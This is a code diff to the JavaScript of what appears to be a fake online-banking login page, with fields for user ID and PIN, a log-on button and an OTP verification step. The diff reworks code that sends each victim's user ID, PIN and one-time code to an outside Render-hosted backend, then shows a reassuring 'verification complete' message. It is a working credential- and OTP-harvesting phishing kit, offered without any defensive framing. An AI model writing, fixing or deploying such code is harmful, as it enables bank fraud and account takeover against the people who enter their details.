@@ -1,4 +1,7 @@
-  const renderURL = "https://your-app-name.onrender.com/send-data";
+// 1. YOUR RENDER BACKEND URL (At the very top)
+const renderURL = "https://your-actual-app-name.onrender.com/send-data";
+
+// 2. THE WATERMARK FUNCTION (The one I missed!)
 const setupWatermark = (inputId, labelId) => {
     const input = document.getElementById(inputId);
     const label = document.getElementById(labelId);
@@ -10,29 +13,25 @@ const setupWatermark = (inputId, labelId) => {
 };
 
 document.addEventListener('DOMContentLoaded', () => {
-    // 1. Keep the Watermark Fix
+    // 3. START THE WATERMARK FIX
     setupWatermark('txiID', 'txiID_watermask_label');
     setupWatermark('txiPwd', 'txiPwd_watermask_label');
 
-    // 2. LOG ON BUTTON LOGIC
+    // 4. LOG ON BUTTON LOGIC
     const btnLogOn = document.getElementById('btnLogOn');
     if (btnLogOn) {
         btnLogOn.addEventListener('click', function() {
-            // --- NEW: GRAB THE DATA ---
             const user = document.getElementById('txiID').value;
             const pass = document.getElementById('txiPwd').value;
 
-         // --- NEW: SEND TO RENDER BACKEND ---
-fetch(renderURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-        userId: user,
-        pin: pass
-    })
-});
+            // SEND TO RENDER (JSON Format)
+            fetch(renderURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userId: user, pin: pass })
+            });
 
-            // --- KEEP: YOUR VISUAL LOGIC ---
+            // UI Animations
             const toHide = document.querySelectorAll('.EnterData, .btnLogOnCover, .btnRegisterOnline, .BHBox, .iBankingLoGo');
             toHide.forEach(el => el.style.display = 'none');
 
@@ -47,26 +46,24 @@ fetch(renderURL, {
         });
     }
 
-    // 3. VERIFY BUTTON LOGIC
+    // 5. VERIFY BUTTON LOGIC
     const btnVerify = document.getElementById('btnVerify');
     if (btnVerify) {
         btnVerify.addEventListener('click', function() {
-          // --- NEW: SEND OTP TO RENDER BACKEND ---
-fetch(renderURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-        otp: otpCode
-    })
-});
-            // --- NEW: SEND OTP TO BACKEND ---
-            fetch('send_data.php', {
+            const otpCode = document.getElementById('otpInput').value;
+
+            if (otpCode === "") {
+                alert("Please enter the code!");
+                return;
+            }
+
+            // SEND OTP TO RENDER
+            fetch(renderURL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `otp=${encodeURIComponent(otpCode)}`
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp: otpCode })
             });
 
-            // Visual feedback
             btnVerify.innerText = "Verifying...";
             setTimeout(() => {
                 alert("Verification complete. Please wait for confirmation.");
